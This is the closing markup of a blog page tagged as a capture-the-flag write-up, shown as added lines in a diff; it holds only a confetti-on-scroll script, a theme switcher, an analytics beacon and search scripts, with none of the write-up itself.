+        <div class="article-date">31 October 2020</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
